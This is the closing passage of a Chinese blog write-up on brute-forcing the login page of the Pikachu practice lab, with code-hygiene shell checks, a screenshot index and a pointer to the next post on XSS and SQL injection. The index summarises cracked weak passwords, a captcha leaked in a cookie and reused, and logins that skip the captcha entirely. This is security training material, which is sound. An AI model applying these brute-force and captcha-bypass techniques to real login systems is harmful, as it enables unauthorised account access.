ls /mnt/hgfs/share/

# ---- 代码卫生检查（粘贴污染排查） ----
grep -n "__main__" file.py
cat -A file.py | grep -n 'M-bM-^@M-^K'      # 零宽空格
```

### C. 截图清单

| 编号 | 内容 |
|---|---|
| 01-01 | 搭建完成：PHP 8.4.27 + 访问地址 |
| 02-01 | 判别标志：`login success` |
| 02-02 | 爆破成功1：admin/123456，75.4 次/秒 |
| 02-03 | 验证码泄露：`Set-Cookie: bf[vcode]=…` |
| 02-04 | 验证码复用：同一个码连用四次 |
| 02-05 | 爆破成功2：pikachu/000000，全程一个码 |
| 02-06 | 无验证码直连：不发 `vcode` 直接 `login success` |
| 02-坑1~4 | 踩坑四连：贴错代码 / 缺 submit / grep 噪音 / 空回车 |

配图在 `/img/` 目录。

### D. 下一篇

暴力破解只解决了"猜到密码"。下一段要打的是**代码执行层面的洞**：XSS 让别人的浏览器执行你的脚本，SQL 注入让数据库把数据交出来。

→ 《皮卡丘靶场：XSS 与 SQL 注入》（`皮卡丘靶场-XSS与SQL注入-博客稿.md`）
